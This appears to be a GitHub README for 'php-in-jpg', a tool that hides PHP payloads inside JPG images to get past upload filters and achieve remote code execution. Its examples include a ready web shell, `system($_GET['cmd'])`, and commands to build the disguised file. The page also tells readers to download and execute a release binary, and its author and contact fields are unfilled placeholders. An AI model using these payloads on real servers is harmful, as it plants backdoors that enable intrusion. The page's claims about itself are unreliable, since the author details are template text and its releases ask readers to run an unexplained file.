# php-in-jpg 🖼️💻

![GitHub Repo stars](https://img.shields.io/github/stars/Mxzinedits/php-in-jpg?style=social) ![GitHub forks](https://img.shields.io/github/forks/Mxzinedits/php-in-jpg?style=social) ![GitHub issues](https://img.shields.io/github/issues/Mxzinedits/php-in-jpg?style=social)

php-in-jpg is a simple yet flexible tool that generates .jpg image files embedding PHP payloads, designed to support PHP RCE polyglot techniques. This project is aimed at security researchers and penetration testers looking to explore the potential of PHP in unconventional formats.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)
- [Releases](#releases)

## Features

- **Simple to Use**: Generate .jpg files with embedded PHP payloads easily.
- **Flexible**: Supports various PHP payloads for different scenarios.
- **Polyglot Support**: Ideal for RCE (Remote Code Execution) testing.
- **Lightweight**: Minimal dependencies for quick setup.

## Installation

To get started with php-in-jpg, you need to clone the repository and install the necessary dependencies. Use the following commands:

```bash
git clone https://github.com/Mxzinedits/php-in-jpg.git
cd php-in-jpg
```

Make sure you have PHP installed on your machine. You can check this by running:

```bash
php -v
```

If you don't have PHP installed, please follow the instructions on the [official PHP website](https://www.php.net/manual/en/install.php).

## Usage

After installation, you can generate a .jpg file with a PHP payload. The command structure is as follows:

```bash
php generate.php [payload] [output.jpg]
```

### Parameters

- `payload`: The PHP code you want to embed.
- `output.jpg`: The name of the output file.

For example, to create a .jpg file with a simple PHP payload, you would run:

```bash
php generate.php "<?php phpinfo(); ?>" output.jpg
```

## Examples

Here are a few examples of using php-in-jpg:

### Example 1: Basic PHP Payload

```bash
php generate.php "<?php echo 'Hello, World!'; ?>" hello.jpg
```

This command generates a .jpg file named `hello.jpg` that, when executed on a server, will display "Hello, World!".

### Example 2: RCE Payload

```bash
php generate.php "<?php system($_GET['cmd']); ?>" rce.jpg
```

This command creates an image that allows for command execution via the `cmd` GET parameter.

### Example 3: Polyglot Usage

You can also use php-in-jpg to create polyglot files that serve multiple purposes. For instance:

```bash
php generate.php "<?php echo 'Polyglot!'; ?>" polyglot.jpg
```

This file can be interpreted as both a valid image and a PHP script.

## Contributing

We welcome contributions to php-in-jpg! If you have suggestions or improvements, please follow these steps:

1. Fork the repository.
2. Create a new branch (`git checkout -b feature/YourFeature`).
3. Make your changes and commit them (`git commit -m 'Add new feature'`).
4. Push to the branch (`git push origin feature/YourFeature`).
5. Open a pull request.

Please ensure your code follows the existing style and includes appropriate tests.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For questions or suggestions, feel free to reach out:

- **Author**: [Your Name](https://github.com/YourGitHubProfile)
- **Email**: your.email@example.com

## Releases

You can find the latest releases of php-in-jpg [here](https://github.com/Mxzinedits/php-in-jpg/releases). Download the latest version and execute the file as needed.

To stay updated, visit the [Releases](https://github.com/Mxzinedits/php-in-jpg/releases) section regularly.

## Acknowledgments

- Thanks to the open-source community for their continuous support and contributions.
- Special thanks to the developers of the libraries used in this project.

## Conclusion

php-in-jpg provides a unique way to generate images that can also execute PHP code. This tool is a valuable asset for penetration testers and security researchers. With its simple interface and flexible capabilities, you can explore various RCE techniques effectively.

We hope you find this tool useful in your security assessments. Happy hacking!